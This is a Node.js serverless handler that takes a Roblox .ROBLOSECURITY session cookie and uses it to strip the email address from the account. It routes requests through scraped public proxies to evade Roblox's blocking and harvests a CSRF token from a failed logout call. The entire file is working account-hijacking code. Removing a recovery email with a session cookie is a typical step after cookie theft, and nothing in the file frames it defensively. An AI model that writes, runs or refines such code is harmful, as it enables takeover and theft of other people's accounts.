const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    try {
        // Fetch a fresh list of proxies
        const proxyRes = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all');
        const proxies = proxyRes.data.split('\n').map(p => p.trim()).filter(p => p.length > 0);

        if (proxies.length === 0) {
             return res.status(500).json({ success: false, message: 'Proxy API returned empty list.' });
        }

        // Only try 2 proxies to stay under Vercel's 10-second timeout
        for (let i = 0; i < Math.min(proxies.length, 2); i++) {
            const agent = new HttpsProxyAgent(`http://${proxies[i]}`);
            
            try {
                // 800ms timeout so it fails instantly if the proxy is dead
                const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 800 
                });

                if (authCheck.status === 200) {
                    let csrfToken = '';
                    try {
                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 800 });
                    } catch (err) {
                        if (err.response && err.response.headers['x-csrf-token']) {
                            csrfToken = err.response.headers['x-csrf-token'];
                        } else {
                            continue; 
                        }
                    }

                    try {
                        await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
                            headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
                            httpsAgent: agent, proxy: false, timeout: 800 
                        });
                        
                        return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
                    } catch (err) {
                        if (err.response && err.response.status === 403) {
                            return res.status(403).json({ success: false, message: "Roblox requires a password to remove the email." });
                        }
                    }
                }
            } catch (err) {
                continue; // Try next proxy immediately
            }
        }

        // If we get here, both proxies failed or timed out
        res.status(500).json({ success: false, message: 'Proxies blocked by Roblox firewall. Try again.' });

    } catch (error) {
        res.status(500).json({ success: false, message: 'Network Error: ' + error.message });
    }
}
